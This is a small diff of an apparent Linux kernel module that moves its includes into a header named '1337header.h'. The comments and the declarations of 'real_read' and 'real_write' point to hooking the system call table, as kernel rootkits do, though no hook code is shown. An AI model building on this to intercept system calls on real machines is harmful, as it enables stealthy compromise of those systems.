@@ -1,23 +1,4 @@
-//allows us to perform certain kernel-level operations, such as printk
-#include <linux/kernel.h>
-//allows us to create the module
-#include <linux/module.h>
-//allows us to change memory protection settings for the system call table
-#include <linux/highmem.h>
-//contains the system call numbers
-#include <asm/unistd.h>
-#include <linux/version.h>
-#include <linux/syscalls.h>
-#include <linux/dirent.h>
-#include <linux/string.h>
-#include <linux/slab.h>
-#include <linux/ctype.h>
-#include <linux/dcache.h>
-#include <linux/file.h>
-//processes directory
-#include <linux/proc_fs.h>
-#include <linux/types.h>
-
+#include "1337header.h"
 
 extern asmlinkage long (*real_read)(unsigned int, char __user *, size_t);
 extern asmlinkage long (*real_write)(unsigned int, char __user *, size_t);
